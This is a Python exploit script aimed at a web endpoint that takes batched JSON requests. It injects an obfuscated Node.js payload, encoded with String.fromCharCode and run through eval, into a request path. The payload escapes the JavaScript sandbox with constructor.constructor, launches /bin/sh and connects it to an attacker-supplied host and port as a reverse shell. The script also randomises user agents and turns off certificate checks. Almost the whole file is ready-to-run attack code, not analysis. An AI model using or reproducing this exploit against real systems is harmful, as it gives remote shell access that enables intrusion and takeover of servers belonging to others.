#!/usr/bin/python3
import requests
import urllib3
import os
import sys
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 3

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

#######
# ANY OTHER FUNCTION HERE
#######

def charencode(string):
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

def js_shell(host,port):
    shell_cmd = "/bin/sh"
    # test_line "ref.constructor.constructor('process.exit(0)')();"
    payload = '''
    process = ref.constructor.constructor('return (function(){return process})()')();
    var require = process.mainModule.require;
    var net = require('net'), sh = require('child_process').exec(\'''' + shell_cmd + '''\');
    var client = new net.Socket();
    revhost = "''' + host + '''";
    revport = "''' + port + '''";
    client.connect(revport, revhost, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
    sh.stderr.pipe(client);});'''
    # Encode the payload
    prefix = 'eval(String.fromCharCode('
    enc_payl = charencode(payload)
    suffix = '))'
    return prefix + enc_payl + suffix

def do_request(url,headers,host,port):
    cmd = js_shell(host,port)
    print("[*] Payload using encoded string is: \n" + cmd + "\n")
    req_1 = '{"method":"get","path":"/profile"}'
    req_2 = '{"method":"get","path":"/item"}'
    req_3 = '{"method":"get","path":"/item/$1.id;' + cmd + '"}'
    json = '{"requests":[' + req_1 + ',' + req_2 +',' + req_3 + ']}'
    return requests.post(url,headers=headers,data=json,timeout=timeout,verify=False)

# Main
def main(argv):
    if len(sys.argv) == 4:
        url = sys.argv[1]
        host = sys.argv[2]
        port = sys.argv[3]
    else:
        print("[*] Usage: " + sys.argv[0] + " <url> <revshell_host> <revshell_port>\n")
        exit(0)

    headers = http_headers()

    # Do stuff
    try:
        r = do_request(url,headers,host,port)
        print("[*] HTTP response: \n" + r.text + "\n")
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
